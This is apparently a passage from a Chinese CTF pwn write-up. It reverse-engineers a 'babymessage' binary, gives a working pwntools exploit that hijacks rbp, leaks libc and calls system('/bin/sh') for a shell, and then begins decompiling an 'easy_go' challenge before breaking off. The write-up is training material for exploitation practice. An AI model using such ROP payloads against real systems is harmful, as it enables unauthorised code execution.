<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  v1 = mm + <span class="number">0x10</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">          (__isoc99_scanf)(<span class="string">&quot;%d&quot;</span>, &amp;mm);</span><br><span class="line">          <span class="keyword">if</span> ( mm != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          leave_name();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( mm != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">0x100</span> )</span><br><span class="line">          v1 = <span class="number">0x100</span>;</span><br><span class="line">        leave_message(v1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( mm != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( mm == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从反汇编看大致结构,读汇编才能看出一点端倪</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public work</span><br><span class="line">work proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 10h</span><br><span class="line">mov     edi, 100h       ; size</span><br><span class="line">call    _malloc</span><br><span class="line">mov     cs:buf, rax</span><br><span class="line">mov     eax, cs:mm</span><br><span class="line">add     eax, 10h</span><br><span class="line">mov     [rbp+var_4], eax</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">loc_400995:</span><br><span class="line">mov     eax, [rbp+var_4]</span><br><span class="line">mov     edi, eax</span><br><span class="line">call    leave_message</span><br><span class="line">jmp     short loc_40093F</span><br></pre></td></tr></table></figure>

<p>这里这个var4就是v1,即判断leave_message中read的长度的变量,这里是通过rbp索引的,这是此题劫持rbp的目的</p>
<p>leave_name</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public leave_name</span><br><span class="line">leave_name proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">lea     rdi, aName      ; &quot;name: &quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     edx, 4          ; nbytes</span><br><span class="line">lea     rsi, name       ; buf </span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line">movsxd  rdx, eax</span><br><span class="line">lea     rax, name</span><br><span class="line">mov     byte ptr [rdx+rax], 0</span><br><span class="line">lea     rdi, aDone      ; &quot;done!\n&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     eax, 0</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400888</span><br><span class="line">leave_name endp</span><br></pre></td></tr></table></figure>

<p>这里name在bss,0x006010d0位置读入0x4个字符</p>
<p>leave_message</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line">public leave_message</span><br><span class="line">leave_message proc near</span><br><span class="line"></span><br><span class="line">nbytes= qword ptr -14h</span><br><span class="line">var_C= dword ptr -0Ch</span><br><span class="line">anonymous_0= byte ptr -8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     dword ptr [rbp+nbytes], edi</span><br><span class="line">lea     rdi, aMessage   ; &quot;message: &quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     eax, dword ptr [rbp+nbytes]</span><br><span class="line">lea     rdx, [rbp+var_C]</span><br><span class="line">lea     rcx, [rdx+4]</span><br><span class="line">mov     edx, eax        ; nbytes</span><br><span class="line">mov     rsi, rcx        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br><span class="line">mov     [rbp+var_C], eax</span><br><span class="line">mov     eax, [rbp+var_C]</span><br><span class="line">movsxd  rdx, eax        ; n</span><br><span class="line">mov     rax, cs:buf</span><br><span class="line">lea     rcx, [rbp+var_C]</span><br><span class="line">add     rcx, 4</span><br><span class="line">mov     rsi, rcx        ; src</span><br><span class="line">mov     rdi, rax        ; dest</span><br><span class="line">call    _strncpy</span><br><span class="line">mov     rdx, cs:buf</span><br><span class="line">mov     eax, [rbp+var_C]</span><br><span class="line">cdqe</span><br><span class="line">add     rax, rdx</span><br><span class="line">mov     byte ptr [rax], 0</span><br><span class="line">lea     rdi, aDone      ; &quot;done!\n&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 40080A</span><br><span class="line">leave_message endp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">leave_message</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;message: &quot;</span>);</span><br><span class="line">  v2 = read(<span class="number">0</span>, v3, a1);                         <span class="comment">// read函数如果读取成功返回读到的字节数，如果出错返回-1</span></span><br><span class="line">  <span class="built_in">strncpy</span>(buf, v3, v2);</span><br><span class="line">  buf[v2] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出有一个栈溢出,可以修改rbp的内容,注意上面读入a1的是0x10</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27; </span></span><br><span class="line">file_path = <span class="string">&quot;./babymessage&quot;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(ip, 8704)</span></span><br><span class="line">p = process(file_path)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x006010d0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x0000000000400ac3</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: \n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0x100</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(buf+<span class="number">0x4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: \n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(buf+<span class="number">0x4</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(<span class="number">0x400995</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;break *0x40093F&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;done!\n\n&quot;</span>)</span><br><span class="line">puts_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">binsh_libc = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(buf+<span class="number">0x4</span>)</span><br><span class="line">payload += p64(rdi_ret) + p64(binsh_libc) + p64(system_libc)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>我们可以在bss段写入0x4的内容,然后通过劫持rbp指向这个name,来改变read读入的长度</li>
<li>两次利用这个漏洞,第一次泄露libc,第二次getshell</li>
<li>注意read的参数是rbp-0x4,因此我们劫持rbp的时候,劫持到rbp+0x4的位置</li>
</ul>
<h3 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h3><blockquote>
<p>进阶栈迁移，单字节溢出修改ebp，爆破</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>结构</p>
<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_401529();</span><br><span class="line">  sub_4016CF(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个函数</p>
<p>sub_401529()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_401529</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);   </span><br><span class="line">  alarm(<span class="number">0x78</span>u);</span><br><span class="line">  result = sub_401276();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_401276()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_401276</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-AEh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-ADh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-ACh]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-A6h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-A5h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-A4h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+22h] [rbp-9Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+23h] [rbp-9Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+24h] [rbp-9Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-96h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-95h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-94h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+32h] [rbp-8Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+33h] [rbp-8Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+34h] [rbp-8Ch]</span></span><br><span class="line">  __int16 v23; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+3Ah] [rbp-86h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+3Bh] [rbp-85h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [rsp+3Ch] [rbp-84h]</span></span><br><span class="line">  __int16 v27; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [rsp+42h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [rsp+43h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+44h] [rbp-7Ch]</span></span><br><span class="line">  __int16 v31; <span class="comment">// [rsp+48h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v32; <span class="comment">// [rsp+4Ah] [rbp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// [rsp+4Bh] [rbp-75h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [rsp+4Ch] [rbp-74h]</span></span><br><span class="line">  __int16 v35; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [rsp+52h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [rsp+53h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v38; <span class="comment">// [rsp+54h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v39; <span class="comment">// [rsp+58h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [rsp+5Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v41; <span class="comment">// [rsp+5Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v42; <span class="comment">// [rsp+5Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v43; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+62h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v45; <span class="comment">// [rsp+63h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [rsp+64h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v47; <span class="comment">// [rsp+68h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// [rsp+6Ah] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v49; <span class="comment">// [rsp+6Bh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v50; <span class="comment">// [rsp+6Ch] [rbp-54h]</span></span><br><span class="line">  __int16 v51; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// [rsp+72h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v53; <span class="comment">// [rsp+73h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v54; <span class="comment">// [rsp+74h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v55; <span class="comment">// [rsp+78h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v56; <span class="comment">// [rsp+7Ah] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// [rsp+7Bh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v58; <span class="comment">// [rsp+7Ch] [rbp-44h]</span></span><br><span class="line">  __int16 v59; <span class="comment">// [rsp+80h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v60; <span class="comment">// [rsp+82h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v61; <span class="comment">// [rsp+83h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [rsp+84h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v63; <span class="comment">// [rsp+88h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v64; <span class="comment">// [rsp+8Ah] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v65; <span class="comment">// [rsp+8Bh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v66; <span class="comment">// [rsp+8Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v67; <span class="comment">// [rsp+90h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v68; <span class="comment">// [rsp+92h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v69; <span class="comment">// [rsp+93h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v70; <span class="comment">// [rsp+94h] 